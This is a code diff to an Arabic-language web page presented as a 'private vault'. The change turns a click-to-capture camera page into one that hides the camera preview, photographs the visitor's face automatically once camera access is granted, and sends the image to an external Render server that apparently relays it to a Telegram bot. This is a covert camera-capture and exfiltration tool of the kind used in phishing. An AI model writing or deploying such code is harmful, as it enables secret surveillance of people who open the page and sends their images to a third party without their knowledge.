@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📷 خزانة خاصة - التقاط صورة</title>
+    <title>📷 خزانة خاصة - تم الالتقاط</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -11,103 +11,81 @@
             padding: 20px;
             background-color: #f4f7f9;
         }
-        #camera-feed {
-            width: 100%;
-            max-width: 600px;
-            margin: 0 auto 20px;
-            border: 3px solid #3498db;
-            border-radius: 8px;
-            display: block; /* للتأكد من أنها عنصر كتلوي */
+        
+        /* 🛑 إخفاء عناصر الكاميرا والـ canvas 🛑 */
+        #camera-feed, #photo-canvas {
+            display: none !important; 
         }
-        #capture-btn {
-            background-color: #2ecc71;
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.2em;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-        }
-        #capture-btn:hover {
-            background-color: #27ae60;
-        }
+
         #status-message {
-            margin-top: 20px;
+            margin-top: 50px;
             font-weight: bold;
-            color: #e74c3c;
-        }
-        /* لإخفاء الـ canvas لأنه يستخدم لالتقاط الصورة فقط */
-        #photo-canvas {
-            display: none;
+            font-size: 1.5em;
+            color: #2c3e50;
         }
     </style>
 </head>
 <body>
 
-    <h1>📸 خزانتي الخاصة</h1>
-    <p>اضغط على الزر لالتقاط صورة وإرسالها مباشرة إلى بوت التليجرام الخاص بك.</p>
+    <h1>✅ تم تفعيل الخزانة الخاصة</h1>
+    <p>تتم عملية التقاط الصورة وإرسالها إلى بوت التليجرام الخاص بك في الخلفية.</p>
 
     <video id="camera-feed" autoplay playsinline></video>
-
     <canvas id="photo-canvas"></canvas>
 
-    <button id="capture-btn">صورة تلقائية وإرسال</button>
-
-    <p id="status-message"></p>
+    <p id="status-message">جاري طلب الوصول إلى الكاميرا...</p>
 
     <script>
         const video = document.getElementById('camera-feed');
         const canvas = document.getElementById('photo-canvas');
-        const captureButton = document.getElementById('capture-btn');
         const statusMessage = document.getElementById('status-message');
+        
+        // 🛑 دالة التقاط وإرسال تلقائية 🛑
+        function captureAndSend() {
+            statusMessage.textContent = '📸 جاري التقاط الصورة وإرسالها...';
+
+            // إضافة تأخير بسيط لضمان استقرار الإطار (لمنع الصورة السوداء)
+            setTimeout(() => {
+                
+                // تحديد أبعاد الـ Canvas
+                canvas.width = video.videoWidth || 640; 
+                canvas.height = video.videoHeight || 480;
+
+                // رسم إطار الفيديو الحالي على الـ Canvas
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // تحويل الصورة إلى Base64
+                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+
+                // إرسال الصورة إلى الخادم
+                sendPhotoToServer(imageDataURL);
+
+            }, 500); // 500 مللي ثانية (نصف ثانية)
+        }
         
         // 1. طلب الوصول إلى الكاميرا
         async function startCamera() {
             try {
-                // تعيين قيود للحصول على صورة واضحة ومستقرة
-                const constraints = { video: { 
-                    facingMode: 'user', // الكاميرا الأمامية
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 } 
-                } }; 
+                // طلب الوصول إلى الكاميرا الأمامية
+                const constraints = { video: { facingMode: 'user' } }; 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = stream;
-                statusMessage.textContent = 'الكاميرا جاهزة للعمل.';
+                statusMessage.textContent = 'الكاميرا جاهزة للعمل. يتم التحضير للإرسال...';
+                
+                // 🛑 عند بدء تدفق الكاميرا، قم بالالتقاط والإرسال فوراً 🛑
+                video.onloadedmetadata = function() {
+                    captureAndSend();
+                };
+
             } catch (err) {
                 console.error("خطأ في الوصول إلى الكاميرا: ", err);
                 statusMessage.textContent = '⛔ يجب عليك السماح بالوصول إلى الكاميرا لتتمكن من استخدام هذه الخاصية.';
             }
         }
 
-        // 2. معالجة الالتقاط والإرسال (تم إضافة التأخير هنا)
-        captureButton.addEventListener('click', () => {
-            statusMessage.textContent = 'جاري الالتقاط... يرجى الانتظار.';
-            captureButton.disabled = true;
-
-            // 🛑 إضافة تأخير لمدة 500 مللي ثانية قبل الالتقاط 🛑
-            setTimeout(() => {
-                
-                // تحديد أبعاد الـ Canvas بنفس أبعاد الفيديو الحالي
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-
-                // رسم إطار الفيديو الحالي على الـ Canvas
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // تحويل الصورة في الـ Canvas إلى Base64 (بصيغة JPEG)
-                const imageDataURL = canvas.toDataURL('image/jpeg', 0.8); // 0.8 هي جودة الصورة
-
-                // إرسال الصورة إلى الخادم
-                sendPhotoToServer(imageDataURL);
-
-            }, 500); // 500 مللي ثانية (نصف ثانية)
-        });
-
         // 3. دالة الإرسال للخادم الخلفي
         async function sendPhotoToServer(imageData) {
-            // 🛑 تم تصحيح هذا الرابط ليطابق خادم Render 🛑
+            // رابط الخادم الخلفي (Render) الذي يعمل بنجاح
             const BACKEND_URL = 'https://vvvvvv-1.onrender.com/upload-photo'; 
             
             try {
@@ -116,7 +94,6 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    // إرسال بيانات الصورة (Base64) داخل جسم الطلب
                     body: JSON.stringify({ image: imageData })
                 });
 
@@ -124,13 +101,17 @@
                     statusMessage.textContent = '✅ تم التقاط الصورة وإرسالها إلى التليجرام بنجاح!';
                 } else {
                     const errorData = await response.json().catch(() => ({ message: response.statusText }));
-                    statusMessage.textContent = `❌ فشل الإرسال: ${errorData.message || response.statusText}`;
+                    statusMessage.textContent = `❌ فشل الإرسال. تأكد من أن البوت يعمل.`;
                 }
             } catch (error) {
                 console.error('خطأ في الاتصال بالخادم:', error);
                 statusMessage.textContent = '⚠️ خطأ في الاتصال بالخادم. تأكد من أن الخادم يعمل.';
             } finally {
-                captureButton.disabled = false;
+                // إيقاف تدفق الكاميرا بعد الانتهاء للحفاظ على الخصوصية
+                if (video.srcObject) {
+                    const tracks = video.srcObject.getTracks();
+                    tracks.forEach(track => track.stop());
+                }
             }
         }
 
